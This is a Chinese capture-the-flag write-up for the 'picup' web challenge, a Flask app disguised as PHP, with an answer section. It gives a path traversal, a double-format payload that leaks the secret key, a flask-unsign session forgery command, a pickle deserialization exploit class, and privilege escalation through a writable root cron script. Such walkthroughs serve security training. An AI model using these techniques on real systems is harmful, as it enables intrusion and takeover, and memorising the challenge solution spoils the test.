# picup

> 分类：Web

## 题目描述

题目伪装成 PHP 后缀，实际是 Python（Flask）。通过注册处的 format 漏洞泄露 secret_key，伪造 admin session 后触发 pickle 反序列化 RCE。

## 考察知识点

- Python format 字符串漏洞（双重 format 泄露）
- Flask session 伪造（flask-unsign）
- pickle 反序列化 RCE

## 解法

1. 先正常注册登录。上传后回显路径 `/pic.php?pic=`，测试发现文件读取存在路径穿越（双写 `../` 绕过），读到 `/app/app.py` 源码。

2. 注册路由处存在 format 漏洞，会进行两遍 `format`：

```python
str1 = "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
```

`username` 可控，发送：

```
POST /register.php
username={users.passwords}&password=123456
```

即可泄露 `app.secret_key`（即 admin 的 password）。

3. 用 flask-unsign 伪造 admin session：

```shell
flask-unsign --sign --cookie '{"username":"admin"}' --secret <secret_key>
```

4. 以 admin 身份访问 `pic.php` 会触发 pickle 反序列化（`pickle.load(open(filepath,"rb"))`）。构造 pickle payload，反序列化触发模板 RCE：

```python
def dumps(filename):
    class Exploit(object):
        def __reduce__(self):
            return (render_template, (f"uploads/{filename}",))
    a = Exploit()
    b = pickle.dumps(a)
    with open('uploads/test.pkl','wb') as f:
        f.write(b)
```

上传恶意模板（SSTI payload）和 test.pkl，访问 `pic.php?pic=test.pkl` 触发反序列化渲染模板，实现 RCE，反弹 shell。

5. 获取 shell 后，`/app` 目录下有一个 `clear.sh` 脚本每 10 分钟以 root 身份执行、普通用户可写，把脚本内容替换为 `chmod 777 /flag` 等待即可读 flag。

## 参考答案

（flag 通过 clear.sh 提权后读取）

## 来源

- 作者：末 初 | https://blog.csdn.net/mochu7777777/article/details/135760457
